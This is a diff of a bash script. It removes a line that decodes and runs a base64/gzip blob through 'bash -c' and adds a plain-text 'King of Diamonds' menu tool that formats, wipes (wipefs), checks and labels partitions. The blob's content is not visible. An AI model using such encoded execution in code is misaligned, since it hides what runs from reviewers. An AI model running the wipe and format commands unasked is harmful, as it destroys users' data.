@@ -1,1 +1,98 @@
-bash -c "$(echo H4sICI0XXGcAA0tpbmdfb2ZfRGlhbW9uZHMAzVdhb9NMDP6eX2FCxRhaM7qOfaACCUF5NQEDDRBCgKZr4qynJpe+d9dtFfDfsXNpk7TJtg4mLR+qJL08tp/HZ/vu39sdSbU7EmbseS+/vjh6tvX9cb//rTfoH6Rb3vHw4/BT8eoxPXsa40ynwp4Ym2lxig+34acHdIUJCp3fYTjOoIvgd34y4G+/fOvzHZz8u2sV+xesX2+kOoUshldSpJmKzFM4LoKAjy4IeIVnMkRT/+7XGvg/dHwdvMHzm14N4J8Ngh1LAzbLEvqBhZBQCAlRwcG5tGOIZByjRmUhlgmaubGYmqAN/MuL46PDo/9KYi1Tfi6TBFALsizoLhJWQKbICwSDCYYWI5gKbaWVmQpaPb9VWt5P2TilxG2AQy+At9LYPHxxJmQiRgkRLc3EgFCV6M3l2I3gewG8dgqKEsipJ8BMMZSxDCvybQTeD+CLnGINesTiIlQUviEt+wG8HGM4qToXEglEFapwDiK2qK9jpwn8CXEuRkiELxCqaXYdly8BPwhgeCHtBijXBr+l2uLqcF7GqRDn7zWKCLpT8IeKeZ5nMw20lDb/U/LF3bmSzlu3416AVN7C+d62V43FBcGJzlpdnetBEPg1ADOLMoh5KXST2j+DwfJxr8no6zJHKpm6ZmAlYq5AZUZQLSwq4UMMToMd2KVKuGsi0dtmPpYLr0KsJLOd09Yp0PDC7u/ARWx2QFn+jYXt7+XQsTnhlTVgGcM36I5ItKVhH34M2ELdg0YSyo9AGOgUBtb4WJKeTmIT+It1fs1qne7EYIv5Q3UmElkr5e/EhGr8jIoF7RW8oMxwOWA1be5TIdWKP7FsU73fpDpVphXF12vTxjlwLkvNrpMBNxCq8LsiksGQWErmAXzi3pyKOdicuyyldi3TS6Rjf2MDXdEuWmn5Q6U/TDEK7oa4+03i5p2BaWpuDhvrGuad5naFvcJnnno67dVpKWlsyNM7twWfNFZ7brFuEzZ02Y1FSvKO/Xf112EokeZtLH/6W12XUXZWBiy2Ap3cRrucuOdcqhn03Vd3Q9qDJml5wOGYmVNdnef55LCmq51p1Qb/qAl+EZAbKwI6MjCEw4cU1WyN0AIRjQi9ytT0QaPhwOcwwbk70TAS37HrNSiXLgp60DXeb8+7D0OVM6jx/5nUlLthlqZEIgHS2+X84lH4EKYRTT/FgMIdc1F78/1aqDyAKMtNUZrdW6BB94zmJ/r8wXOX1WqWJCsZV5Cudab5/FR3B7b48y2g3qAyW/oVwKEylkctSoE27ZEn1Z5XpECUKeTA39EiMKGWU04e6j/53lo91nvuOP8HMV8PEh4QAAA= | base64 -d | gunzip)"
+#!/bin/bash
+
+CYAN='\033[1;36m'
+RESET='\033[0m'
+
+reformat_storage() {
+    clear
+    echo -e "${CYAN}"
+    echo "     ___________________________________________________________________________"
+    echo "    |                   King of Diamonds: Reformat Storage Devices              |"
+    echo "    |___________________________________________________________________________|"
+    echo "    |                                                                           |"
+    echo "    | Use this tool to reformat storage devices with different filesystems.     |"
+    echo "    | WARNING: Reformatting will erase all data on the selected partition.      |"
+    echo "    |                                                                           |"
+    echo "    | Options:                                                                  |"
+    echo "    |  1. List all available disks and partitions                               |"
+    echo "    |  2. Format a partition with a specific filesystem                         |"
+    echo "    |  3. Wipe a partition before formatting                                    |"
+    echo "    |  4. Check filesystem consistency after formatting                         |"
+    echo "    |  5. Label a formatted partition                                           |"
+    echo "    |  6. Exit                                                                  |"
+    echo "    |___________________________________________________________________________|"
+    echo -e "${RESET}"
+
+    read -p "Enter your choice: " choice
+    case $choice in
+        1)
+            echo "Listing all available disks and partitions..."
+            sudo fdisk -l
+            ;;
+        2)
+            echo "Formatting a partition..."
+            read -p "Enter the partition to format (e.g., /dev/sda1): " partition
+            read -p "Enter the filesystem type (e.g., ext4, xfs, ntfs, fat32): " fs_type
+            if [ -b "$partition" ]; then
+                echo "Formatting $partition as $fs_type..."
+                sudo mkfs."$fs_type" "$partition"
+            else
+                echo "Invalid partition. Make sure it exists and try again."
+            fi
+            ;;
+        3)
+            echo "Wiping a partition before formatting..."
+            read -p "Enter the partition to wipe (e.g., /dev/sda1): " partition
+            if [ -b "$partition" ]; then
+                echo "Wiping $partition securely. This may take some time..."
+                sudo wipefs -a "$partition"
+                echo "Partition wiped."
+            else
+                echo "Invalid partition. Make sure it exists and try again."
+            fi
+            ;;
+        4)
+            echo "Checking filesystem consistency..."
+            read -p "Enter the partition to check (e.g., /dev/sda1): " partition
+            if [ -b "$partition" ]; then
+                echo "Checking filesystem consistency on $partition..."
+                sudo fsck "$partition"
+            else
+                echo "Invalid partition. Make sure it exists and try again."
+            fi
+            ;;
+        5)
+            echo "Labeling a formatted partition..."
+            read -p "Enter the partition to label (e.g., /dev/sda1): " partition
+            read -p "Enter the label name: " label
+            if [ -b "$partition" ]; then
+                echo "Labeling $partition with name $label..."
+                sudo e2label "$partition" "$label"
+            else
+                echo "Invalid partition. Make sure it exists and try again."
+            fi
+            ;;
+        6)
+            echo "Exiting the reformatting tool."
+            return
+            ;;
+        *)
+            echo "Invalid choice. Returning to menu..."
+            ;;
+    esac
+
+    echo "Press any key to return to the menu..."
+    read -n 1 -s
+}
+
+# Ensure required commands are available
+for cmd in fdisk mkfs wipefs fsck e2label; do
+    if ! command -v $cmd &> /dev/null; then
+        echo "Error: Required command '$cmd' is not available. Install it and try again."
+        exit 1
+    fi
+done
+
+# Main script execution
+reformat_storage
+clear
